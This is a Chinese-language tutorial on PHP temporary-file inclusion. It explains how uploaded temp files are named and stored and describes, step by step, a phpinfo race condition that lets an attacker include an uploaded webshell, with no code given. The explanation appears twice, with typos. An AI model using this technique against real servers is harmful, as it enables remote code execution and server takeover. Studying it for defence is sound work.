临时文件包含

原理

假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务器存储我们恶意生成的临时文件，该临时文件包含我们构造的恶意代码，此时服务器就存在我们可以包含的文件。

目前，常见的两种临时文件包含漏洞利用方式是： PHPINFO（） and PHP7 Sement Fault,利用这两种奇淫技巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果，也就是拿到服务器权限进行后续操作。

以下是php临时文件的机制：

$_FILE 超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。

在临时文件包含漏洞中$_FILES[‘userfile’][‘name’]这个变量值的获取很重要，因为临时文件的名字都是由随机函数生成的，只有知道文件的名字才能正确的去包含它。

目录

文件被上传之后，默认会存储到服务端的默认临时目录中，该临时目录由PHP.ini 的UPload_tmp_dir 属性指定，假如 upload_tmp_dir 的路径不可写，PHP 会上传到系统默认的临时目录。

命名规则：

存储在服务器上的临时文件的文件名都是随机生成的，了解不同系统服务器对临时文件的命名规则很重要，因为有时候对于临时文件我们需要去爆破，此时我们需要知道它的命令规则是什么。

漏洞分析：

当我们在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存未一个临时文件。文件名可以在$_FILES变量中找到。这个临时文件，在请求结束后就会被删除。

利用phpinfo的特性可以很好的帮助我们，因为phpinfo页面会将当前请求上下文中所有变量都打印出来，所以我们如果向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到$_FILES变量的内容，拿到临时文件变量名之后，就可以进行包含执行我们传入的恶意代码。

利用原理：

验证了phpinfo的特性确实存在，所以在文件包含漏洞找不到可利用的文件时，我们就可以利用这一特性，找到并提取临时文件名，然后包含之即可Getshell。

计算机服务器

但文件包含漏洞和phpinfo页面通常是两个页面，理论上我们需要先发送数据包给phpinfo页面，然后从返回页面中匹配出临时文件名，再将这个文件名发送给文件包含漏洞页面，进行getshell。在第一个请求结束时，临时文件就被删除了，第二个请求自然也就无法进行包含。

利用过程：

这个时候就需要用到条件竞争，具体原理和过程如下：

(1) 发送包含了webshell 的上传数据包给phpinfo页面，这个数据包的header、 get 等位置需要塞满垃圾数据。
(2) 因为 phpinfo 页面会将所有的数据都打印出来，1中的数据会将整个 phpinfio 页面撑的非常大。
(3) php 默认的输出缓冲区为4096，可以理解为 php 每次返回 4096 个字节给socket 连接。
(4) 所以，我们直接操作原生的 socket ，每次读取4096个字节.只要读取到的字符里包含临时文件名，就立即发送第二个数据包。
(5) 此时，第一个数据包的 socket 连接实际上还没有结束，因为 php 还在继续每次输出4096个字节，所以临时文件还没有删除。
(6) 利用这个时间差，第二个数据包，也就是文件包含漏洞的利用，即成功包含临时文件，最终getshell。

简介

有时我们在面对在服务器上找不到我们可以包含的文件时 我们可以尝试一下让服务器储存我们恶意生成的临时文件 该临时文件包含我们构造的恶意代码 此时服务器就存在我们可以包含的文件

目前常见的两种临时文件包含漏洞的主要利用方式是:PHPINFO()和PHP7 Segment Fault

利用这两种方法可以向服务器上传文件同时在服务器上生成恶意的临时文件 然后将恶意的临时文件包含就可以达到任意代码执行的效果

临时文件是什么

我们在php中上传的文件会保存到全局变量$__FILES里面 它是一个二维数组 里面储存了我们上传文件的信息

这里很重要的是我们要知道name这个变量的值 因为临时文件的名字都是由随机函数生成的 只有知道文件的名字才能正确的去包含它

存储目录

文件被上传后默认会被存储到服务器端的默认临时目录 该临时目录由php.ini的upload_tmp_dir属性指定 假如upload_tmp_dir的路径不可写 php就会上传到系统默认的临时文件目录里面去

linux

linux系统的临时文件主要存储在根目录的/tmp文件下

windows

windows系统服务的临时文件主要存储在系统盘的windows文件夹下 具有一定的开放权限

C:/Windows/

C:/Windows/Temp/

临时文件命名规则

linux

linux的临时文件通查储存在/tmp/目录下 格式通常是：/tmp/php六个随机字符

windows

windows的临时文件主要储存到C:/Windows/目录下，格式通常是（C:/Windows/php[4个随机字符].tmp）

PHPINFO特性

在php当中 我们只要向服务器上的任意一个文件发送了带有文件数据的POST请求 那么php在执行这个页面的代码之前就会把这个文件接收下来 斌临时保存在系统的临时目录下 同时会把这个文件的信息存储到$__FILES这个数组里面

php的清理机制是一旦当前这个php及哦啊本运行结束 系统就会立刻删除刚刚的那个临时文件 所以我们直接来做的话既要想办法搞到临时文件的名字 还要去到有文件包含漏洞的页面去包含 我们第一步光找名字就够得找了

这时我们可以利用phpinfo这个页面根据它返回的变量信息去得到我们临时文件的名字 但是当phpinfo这=这个页面执行完之后这个临时文件也会被删除 那我们这里就要写一个条件竞争的脚本了

1.我们发送包含了恶意代码的数据包给phpinfo界面 这个数据包我们想办法把它塞得尽可能的大 这样处理它时就需要更多的时间 这样也为我们后续的条件竞争尽可能的创造条件 我们要在这个数据包的header get等位置塞满大量的垃圾数据

2.然后我们写好了的脚本这个时候就会读取phpinfo界面返回的临时文件信息 并且去到文件包含的界面疯狂请求 造成文件包含

利用ph牛的代码，不用重复的造轮子，直接更改脚本主要的几个地方就可以成功运行利用，如上传的恶意文件内容、phpinfo.php和index.php相应文件的文件名和位置、系统临时文件写入目录等
